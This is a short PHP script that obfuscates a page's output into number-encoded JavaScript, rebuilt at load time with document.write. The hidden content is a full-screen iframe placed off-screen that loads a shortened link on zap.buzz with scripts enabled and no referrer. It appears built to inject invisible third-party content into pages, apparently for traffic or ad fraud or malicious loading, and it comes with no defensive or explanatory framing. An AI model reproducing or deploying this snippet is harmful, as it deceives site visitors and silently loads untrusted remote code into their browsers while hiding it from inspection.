<?php
function randomString($length = 8) {
    $randomString = '';
    $characters = implode("", array_merge(range('a', 'z'), range('A', 'Z')));

    for ($i = 0; $i < $length; $i++)
        $randomString .= $characters[mt_rand(0, strlen($characters) - 1)];

    return $randomString;
}

function enc($output) { //Obfuscation code
    $randomFunc = randomString(mt_rand(6,12));
    $randomOut = randomString(mt_rand(6,12));
    $randomNum = randomString(mt_rand(6,12));
    $randomVal = mt_rand(1337, 99999999);

    $return .= 'var ' . $randomOut . ' = "";' . PHP_EOL;
    $return .= 'var ' . $randomNum . ' = [';

    foreach(str_split($output) as $x) {
        $return .= (ord($x) + $randomVal) . ', ';
    }

    $return = rtrim($return, ', ');
    $return .= '];' . PHP_EOL;

    $return .= $randomNum . '.forEach(function ' . $randomFunc . '(value) { ' . $randomOut . ' += String.fromCharCode(parseInt(value) - ' . $randomVal . '); } );' . PHP_EOL;
    $return .= 'document.write(' . $randomOut . ');' . PHP_EOL;

    return $return;
}

ob_start("enc");

?>

<iframe src="https://zap.buzz/2YX8Ryw" referrerpolicy="no-referrer" sandbox="allow-forms allow-scripts allow-same-origin" class="ppxls_awersd" style="width: 1920px; height: 1080px; position:absolute; left:-1990px"  frameborder="0" scrolling="no"></iframe>

<?php
ob_end_flush();
?>